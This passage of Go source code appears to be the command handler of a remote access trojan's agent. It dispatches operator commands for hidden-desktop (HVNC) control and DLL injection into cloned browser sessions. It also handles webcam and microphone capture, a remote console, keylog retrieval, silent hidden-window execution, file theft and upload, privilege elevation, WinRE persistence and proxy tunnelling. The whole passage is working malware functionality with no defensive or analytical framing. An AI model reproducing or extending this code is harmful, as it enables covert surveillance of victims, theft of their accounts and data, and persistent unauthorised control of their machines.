				delta = int32(v)
			case uint8:
				delta = int32(v)
			case uint16:
				delta = int32(v)
			case uint32:
				delta = int32(v)
			case uint64:
				delta = int32(v)
			}
			switch v := payload["x"].(type) {
			case float64:
				x = int32(v)
			case float32:
				x = int32(v)
			case int:
				x = int32(v)
			case int8:
				x = int32(v)
			case int16:
				x = int32(v)
			case int32:
				x = v
			case int64:
				x = int32(v)
			case uint:
				x = int32(v)
			case uint8:
				x = int32(v)
			case uint16:
				x = int32(v)
			case uint32:
				x = int32(v)
			case uint64:
				x = int32(v)
			}
			switch v := payload["y"].(type) {
			case float64:
				y = int32(v)
			case float32:
				y = int32(v)
			case int:
				y = int32(v)
			case int8:
				y = int32(v)
			case int16:
				y = int32(v)
			case int32:
				y = v
			case int64:
				y = int32(v)
			case uint:
				y = int32(v)
			case uint8:
				y = int32(v)
			case uint16:
				y = int32(v)
			case uint32:
				y = int32(v)
			case uint64:
				y = int32(v)
			}
		}
		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseWheel, display: env.HVNCSelectedDisplay, delta: delta, x: x, y: y})
		return nil
	case "hvnc_key_down":
		if !env.HVNCKeyboardControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVKHVNC(code); vk != 0 {
			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
		}
		return nil
	case "hvnc_key_up":
		if !env.HVNCKeyboardControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVKHVNC(code); vk != 0 {
			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
		}
		return nil
	case "hvnc_start_process":
		payload, _ := envelope["payload"].(map[string]interface{})
		filePath := ""
		killExe := ""
		if payload != nil {
			if v, ok := payload["path"].(string); ok {
				filePath = v
			}
			if v, ok := payload["kill_exe"].(string); ok {
				killExe = v
			}
		}
		log.Printf("hvnc: start process %q (kill_exe=%q)", filePath, killExe)
		sendCommandResultSafe(env, cmdID, true, "")
		goSafe("hvnc_start_process", nil, func() {
			if killExe != "" {
				out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
				log.Printf("hvnc: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
			}
			if err := capture.StartHVNCProcess(filePath); err != nil {
				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
			}
		})
		return nil

	case "hvnc_lookup":
		payload, _ := envelope["payload"].(map[string]interface{})
		exeName := ""
		if payload != nil {
			if v, ok := payload["exe"].(string); ok {
				exeName = v
			}
		}
		if exeName == "" {
			sendCommandResultSafe(env, cmdID, false, "no exe name provided")
			return nil
		}
		log.Printf("hvnc: lookup exe %q", exeName)
		sendCommandResultSafe(env, cmdID, true, "")
		goSafe("hvnc_lookup", nil, func() {
			filesearch.LookupExe(exeName, 8, func(path string) {
				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
					Type: "hvnc_lookup_result",
					Exe:  exeName,
					Path: path,
					Done: false,
				})
			})
			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
				Type: "hvnc_lookup_result",
				Exe:  exeName,
				Path: "",
				Done: true,
			})
			log.Printf("hvnc: lookup complete for %q", exeName)
		})
		return nil

	case "hvnc_start_process_injected":
		payload, _ := envelope["payload"].(map[string]interface{})
		filePath := ""
		searchPath := ""
		replacePath := ""
		if payload != nil {
			if v, ok := payload["path"].(string); ok {
				filePath = v
			}
			if v, ok := payload["search_path"].(string); ok {
				searchPath = v
			}
			if v, ok := payload["replace_path"].(string); ok {
				replacePath = v
			}
		}
		dllBytes := extractDLLBytes(payload)
		if len(dllBytes) == 0 {
			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
			return nil
		}
		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d", filePath, searchPath, replacePath, len(dllBytes))
		sendCommandResultSafe(env, cmdID, true, "")
		goSafe("hvnc_start_process_injected", nil, func() {
			if err := capture.StartHVNCProcessInjected(filePath, dllBytes, searchPath, replacePath); err != nil {
				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
			}
		})
		return nil

	case "hvnc_start_chrome_injected":
		payload, _ := envelope["payload"].(map[string]interface{})
		chromePath := ""
		if payload != nil {
			if v, ok := payload["path"].(string); ok {
				chromePath = v
			}
		}
		dllBytes := extractDLLBytes(payload)
		if len(dllBytes) == 0 {
			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
			return nil
		}
		log.Printf("hvnc: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
		sendCommandResultSafe(env, cmdID, true, "")
		goSafe("hvnc_start_chrome_injected", nil, func() {
			if err := capture.StartHVNCChromeInjected(chromePath, dllBytes); err != nil {
				log.Printf("hvnc: chrome injected failed: %v", err)
			}
		})
		return nil

	case "hvnc_start_browser_injected":
		payload, _ := envelope["payload"].(map[string]interface{})
		browser := ""
		exePath := ""
		clone := true
		cloneLite := false
		killIfRunning := false
		if payload != nil {
			if v, ok := payload["browser"].(string); ok {
				browser = v
			}
			if v, ok := payload["path"].(string); ok {
				exePath = v
			}
			if v, ok := payload["clone"].(bool); ok {
				clone = v
			}
			if v, ok := payload["cloneLite"].(bool); ok {
				cloneLite = v
			}
			if v, ok := payload["killIfRunning"].(bool); ok {
				killIfRunning = v
			}
		}
		dllBytes := extractDLLBytes(payload)
		if len(dllBytes) == 0 {
			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
			return nil
		}
		if browser == "" {
			sendCommandResultSafe(env, cmdID, false, "no browser specified")
			return nil
		}
		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, len(dllBytes))
		sendCommandResultSafe(env, cmdID, true, "")
		goSafe("hvnc_start_browser_injected", nil, func() {
			var onProgress capture.CloneProgressFunc
			if clone {
				onProgress = func(percent int, copiedBytes, totalBytes int64, status string) {
					_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCCloneProgress{
						Type:        "hvnc_clone_progress",
						Browser:     browser,
						Percent:     percent,
						CopiedBytes: copiedBytes,
						TotalBytes:  totalBytes,
						Status:      status,
					})
				}
			}
			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, clone, cloneLite, killIfRunning, onProgress); err != nil {
				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
			}
		})
		return nil

	case "webcam_start":
		env.WebcamMu.Lock()
		if env.WebcamCancel != nil {
			env.WebcamCancel()
			waitStreamStop(env.WebcamDone, "webcam")
		}
		webcamCtx, cancel := context.WithCancel(ctx)
		env.WebcamCancel = cancel
		done := make(chan struct{})
		env.WebcamDone = done
		goSafe("webcam stream", env.Cancel, func() {
			log.Printf("webcam: start requested")
			_ = WebcamStart(webcamCtx, env)
			close(done)
		})
		env.WebcamMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "webcam_list":
		devices, err := capture.ListWebcams()
		if err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return nil
		}
		out := make([]wire.WebcamDevice, 0, len(devices))
		for _, dev := range devices {
			out = append(out, wire.WebcamDevice{Index: dev.Index, Name: dev.Name, MaxFPS: dev.MaxFPS})
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.WebcamDevices{Type: "webcam_devices", Devices: out, Selected: env.WebcamDeviceIndex})
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "webcam_select":
		payload, _ := envelope["payload"].(map[string]interface{})
		index := 0
		if payload != nil {
			if n, ok := payloadInt(payload, "index"); ok {
				index = n
			}
		}
		env.WebcamDeviceIndex = index
		capture.CleanupWebcam()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "webcam_set_fps":
		payload, _ := envelope["payload"].(map[string]interface{})
		env.WebcamMu.Lock()
		isStreaming := env.WebcamCancel != nil
		env.WebcamMu.Unlock()
		if isStreaming {
			sendCommandResultSafe(env, cmdID, false, "stop webcam before changing fps")
			return nil
		}
		fps := env.WebcamFPS
		useMax := env.WebcamUseMaxFPS
		if payload != nil {
			if n, ok := payloadInt(payload, "fps"); ok {
				fps = n
			}
			if v, ok := payload["useMax"].(bool); ok {
				useMax = v
			}
		}
		if fps < 1 {
			fps = 30
		}
		if fps > 120 {
			fps = 120
		}
		clampedFPS, clampErr := capture.ClampWebcamFPS(env.WebcamDeviceIndex, fps, useMax)
		if clampErr != nil {
			log.Printf("webcam: fps clamp fallback requested=%d err=%v", fps, clampErr)
		} else {
			fps = clampedFPS
		}
		env.WebcamFPS = fps
		env.WebcamUseMaxFPS = useMax
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "webcam_set_quality":
		payload, _ := envelope["payload"].(map[string]interface{})
		quality := 0
		codec := ""
		if payload != nil {
			if q, ok := payloadInt(payload, "quality"); ok {
				quality = q
			}
			if v, ok := payload["codec"].(string); ok {
				codec = v
			}
		}
		if quality < 0 {
			quality = 0
		}
		if quality > 100 {
			quality = 100
		}
		switch codec {
		case "jpeg", "h264":
			// valid
		default:
			codec = "jpeg"
		}
		env.WebcamQuality = quality
		env.WebcamCodec = codec
		log.Printf("webcam: set quality=%d codec=%s", quality, codec)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "webcam_stop":
		env.WebcamMu.Lock()
		log.Printf("webcam: stop requested")
		if env.WebcamCancel != nil {
			env.WebcamCancel()
		}
		waitStreamStop(env.WebcamDone, "webcam")
		env.WebcamCancel = nil
		env.WebcamDone = nil
		env.WebcamMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil

	case "console_start":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		cols, rows := envelopePayloadInts(envelope)
		if sessionID == "" {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing session id"})
		}
		if err := console.Start(ctx, env, sessionID, cols, rows); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
			return nil
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_input":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		data, _ := envelopePayloadString(envelope, "data")
		if sessionID != "" && data != "" {
			_ = console.Input(sessionID, data)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_stop":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		if sessionID != "" {
			console.Stop(sessionID)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_resize":

		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		cols, rows := envelopePayloadInts(envelope)
		_ = sessionID
		console.Resize(sessionID, cols, rows)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "voice_session_start":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		source := "default"
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload != nil {
			if v, ok := payload["source"].(string); ok && strings.TrimSpace(v) != "" {
				source = strings.TrimSpace(v)
			}
		}
		if err := startVoiceSession(ctx, env, sessionID, source); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "voice_session_stop":
		stopVoiceSession()
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "voice_downlink":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload"})
		}
		data, _ := payload["data"].([]byte)
		if err := writeVoiceDownlink(data); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "voice_capabilities":
		caps := audio.ProbeCapabilities()
		payload, _ := json.Marshal(caps)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: caps.Available, Message: string(payload)})
	}

	switch action {
	case "file_list":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileList(ctx, env, cmdID, path)
	case "file_download":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileDownload(ctx, env, cmdID, path)
	case "file_upload":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		offset := payloadNumberToInt64(payload["offset"])
		total := payloadNumberToInt64(payload["total"])
		transferID, _ := payload["transferId"].(string)
		data := []byte{}
		if d, ok := payload["data"].([]byte); ok {
			data = d
		}
		return HandleFileUpload(ctx, env, cmdID, path, data, offset, total, transferID)
	case "file_upload_http":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		sourceURL, _ := payload["url"].(string)
		total := payloadNumberToInt64(payload["total"])
		return HandleFileUploadHTTP(ctx, env, cmdID, path, sourceURL, total)
	case "file_delete":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileDelete(ctx, env, cmdID, path)
	case "file_mkdir":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileMkdir(ctx, env, cmdID, path)
	case "file_zip":
		path, _ := envelopePayloadString(envelope, "path")

		zipCtx, cancel := context.WithCancel(ctx)
		registerCancellableCommand(cmdID, cancel)
		goSafe("file_zip", env.Cancel, func() {
			defer unregisterCommand(cmdID)
			if err := HandleFileZip(zipCtx, env, cmdID, path); err != nil && err != context.Canceled {
				log.Printf("file_zip error: %v", err)
			}
		})
		return nil
	case "file_read":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		maxSize := int64(0)
		if ms, ok := payload["maxSize"].(float64); ok {
			maxSize = int64(ms)
		}
		return HandleFileRead(ctx, env, cmdID, path, maxSize)
	case "file_write":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		content, _ := payload["content"].(string)
		return HandleFileWrite(ctx, env, cmdID, path, content)
	case "file_search":
		payload, _ := envelope["payload"].(map[string]interface{})
		searchID, _ := payload["searchId"].(string)
		basePath, _ := payload["path"].(string)
		pattern, _ := payload["pattern"].(string)
		searchContent := false
		if sc, ok := payload["searchContent"].(bool); ok {
			searchContent = sc
		}
		maxResults := 0
		if mr, ok := payload["maxResults"].(float64); ok {
			maxResults = int(mr)
		}
		return HandleFileSearch(ctx, env, cmdID, searchID, basePath, pattern, searchContent, maxResults)
	case "file_copy":
		payload, _ := envelope["payload"].(map[string]interface{})
		source, _ := payload["source"].(string)
		dest, _ := payload["dest"].(string)
		return HandleFileCopy(ctx, env, cmdID, source, dest)
	case "file_move":
		payload, _ := envelope["payload"].(map[string]interface{})
		source, _ := payload["source"].(string)
		dest, _ := payload["dest"].(string)
		return HandleFileMove(ctx, env, cmdID, source, dest)
	case "file_chmod":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		mode, _ := payload["mode"].(string)
		return HandleFileChmod(ctx, env, cmdID, path, mode)
	case "file_execute":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		return HandleFileExecute(ctx, env, cmdID, path)
	case "agent_update":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		hash, _ := payload["hash"].(string)
		hideWindow, _ := payload["hideWindow"].(bool)
		return HandleAgentUpdate(ctx, env, cmdID, path, hash, hideWindow)
	case "process_list":
		return HandleProcessList(ctx, env, cmdID)
	case "process_kill":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil {
			if rawPayload, ok := envelope["payload"].(map[interface{}]interface{}); ok {
				payload = make(map[string]interface{}, len(rawPayload))
				for k, v := range rawPayload {
					ks, ok := k.(string)
					if !ok {
						continue
					}
					payload[ks] = v
				}
			}
		}
		pid := int32(0)
		if p, ok := payload["pid"].(float64); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(string); ok {
			if parsed, err := strconv.Atoi(p); err == nil {
				pid = int32(parsed)
			}
		}
		if p, ok := payload["pid"].(uint16); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(uint8); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(uint64); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(uint32); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(uint); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(int32); ok {
			pid = p
		}
		if p, ok := payload["pid"].(int64); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(int); ok {
			pid = int32(p)
		}
		return HandleProcessKill(ctx, env, cmdID, pid)
	case "keylog_list":
		return HandleKeylogList(ctx, env, cmdID)
	case "keylog_retrieve":
		payload, _ := envelope["payload"].(map[string]interface{})
		filename, _ := payload["filename"].(string)
		return HandleKeylogRetrieve(ctx, env, cmdID, filename)
	case "keylog_clear_all":
		return HandleKeylogClearAll(ctx, env, cmdID)
	case "keylog_delete":
		payload, _ := envelope["payload"].(map[string]interface{})
		filename, _ := payload["filename"].(string)
		return HandleKeylogDelete(ctx, env, cmdID, filename)
	case "script_exec":
		payload, _ := envelope["payload"].(map[string]interface{})
		scriptContent, _ := payload["script"].(string)
		scriptType, _ := payload["type"].(string)
		if scriptType == "" {
			scriptType = "powershell"
		}
		return HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType)
	case "silent_exec":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil {
			if rawPayload, ok := envelope["payload"].(map[interface{}]interface{}); ok {
				payload = make(map[string]interface{}, len(rawPayload))
				for k, v := range rawPayload {
					ks, ok := k.(string)
					if !ok {
						continue
					}
					payload[ks] = v
				}
			}
		}
		command, _ := payload["command"].(string)
		command = strings.TrimSpace(command)
		if len(command) >= 2 {
			if (command[0] == '"' && command[len(command)-1] == '"') || (command[0] == '\'' && command[len(command)-1] == '\'') {
				command = command[1 : len(command)-1]
			}
		}
		argsRaw, _ := payload["args"].(string)
		hideWindow := true
		if v, ok := payload["hideWindow"].(bool); ok {
			hideWindow = v
		}
		cwd, _ := payload["cwd"].(string)
		if command == "" {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing command"})
		}
		args := parseCommandArgs(argsRaw)
		if err := startSilentProcess(command, args, cwd, hideWindow); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "winre_install":
		payload := payloadAsMap(envelope["payload"])
		useSelf := false
		if v, ok := payload["useSelf"].(bool); ok {
			useSelf = v
		}
		filePath, _ := payload["filePath"].(string)
		if err := handleWinREInstall(ctx, env, cmdID, filePath, useSelf); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "winre_uninstall":
		if err := handleWinREUninstall(ctx, env, cmdID); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "uninstall":
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)

		if err := removePersistence(); err != nil {
			log.Printf("uninstall: failed to remove persistence: %v", err)
		}

		criticalproc.Teardown()
		os.Exit(0)
	case "disconnect":
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)
		resetForReconnect(env)
		criticalproc.Teardown()
		os.Exit(0)
		return nil
	case "reconnect":
		resetForReconnect(env)
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)
		return ErrReconnect
	case "elevate":
		payload, _ := envelope["payload"].(map[string]interface{})
		password, _ := payload["password"].(string)
		return HandleElevate(ctx, env, cmdID, password)
	case "proxy_connect":
		payload, _ := envelope["payload"].(map[string]interface{})
		return HandleProxyConnect(ctx, env, cmdID, payload)
	case "proxy_data":
		payload, _ := envelope["payload"].(map[string]interface{})
		return HandleProxyData(ctx, env, cmdID, payload)
	case "proxy_close":
		return HandleProxyClose(ctx, env, cmdID)
	default:
		log.Printf("command: unknown action=%s", action)
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unknown command"}
		return wire.WriteMsg(ctx, env.Conn, res)
	}

	return nil
}

func envelopePayloadString(envelope map[string]interface{}, key string) (string, bool) {
	payload, _ := envelope["payload"].(map[string]interface{})
	if payload == nil {
		return "", false
	}
	val, _ := payload[key].(string)
	return val, val != ""
}

func envelopePayloadInts(envelope map[string]interface{}) (int, int) {
	payload, _ := envelope["payload"].(map[string]interface{})
	if payload == nil {
		return 0, 0
	}
	cols, _ := payload["cols"].(int)
	rows, _ := payload["rows"].(int)

	if cols == 0 {
		if f, ok := payload["cols"].(float64); ok {
			cols = int(f)
		}
		if i, ok := payload["cols"].(int64); ok {
			cols = int(i)
		}
	}
	if rows == 0 {
		if f, ok := payload["rows"].(float64); ok {
			rows = int(f)
		}
		if i, ok := payload["rows"].(int64); ok {
			rows = int(i)
		}
	}
	if cols == 0 {
		cols = 120
	}
	if rows == 0 {
		rows = 36
	}
	return cols, rows
}

func toInt(v interface{}) int {
	if v == nil {
		return 0
	}
	if i, ok := v.(int); ok {
		return i
	}
	if i, ok := v.(int8); ok {
		return int(i)
	}
	if i, ok := v.(int16); ok {
		return int(i)
	}
	if i, ok := v.(int32); ok {
		return int(i)
	}
	if i, ok := v.(int64); ok {
		return int(i)
	}
	if i, ok := v.(uint8); ok {
		return int(i)
	}
	if i, ok := v.(uint16); ok {
		return int(i)
	}
	if i, ok := v.(uint32); ok {
		return int(i)
	}
	if i, ok := v.(uint64); ok {
		return int(i)
	}
	if f, ok := v.(float64); ok {
		return int(f)
	}
	return 0
}
